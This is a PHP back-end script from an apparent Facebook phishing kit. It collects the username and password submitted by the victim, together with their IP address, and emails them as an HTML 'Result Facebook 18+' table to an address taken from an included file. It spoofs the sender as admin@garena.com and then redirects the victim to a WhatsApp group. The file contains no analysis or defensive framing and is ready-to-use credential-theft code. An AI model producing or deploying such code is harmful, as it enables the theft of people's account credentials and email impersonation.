<!-- Halo mo ngapain om -->
	
<?php
$email = $_POST['user'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "Script Reedit - By Nis Apz😎 | PUNYA SI {$email} |";
$message = '
<center> 
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3.5"><b>Result Facebook 18+</b></font>
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <td style="width:22%;text-align:left;" height="25px"><b>Email</td>
  <td style="width:78%;text-align: center;"><b>'.$email.'</td> 
 </tr>
 <tr>
  <td style="width:22%;text-align:left;" height="25px"><b>Password</td>
  <td style="width:78%;text-align: center;"><b>'.$password.'</td> 
 </tr>
 </table>
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3"><b>Ahmadstore.my.id</b></font>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: WEB NIS GG😎  <admin@garena.com>' . "\r\n";
$kirim = mail($alexhost, $subject, $message, $headersx);
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/D3XkASpg6OZ49iWMh0wYNg">
</head>
<body>
</body>
</html>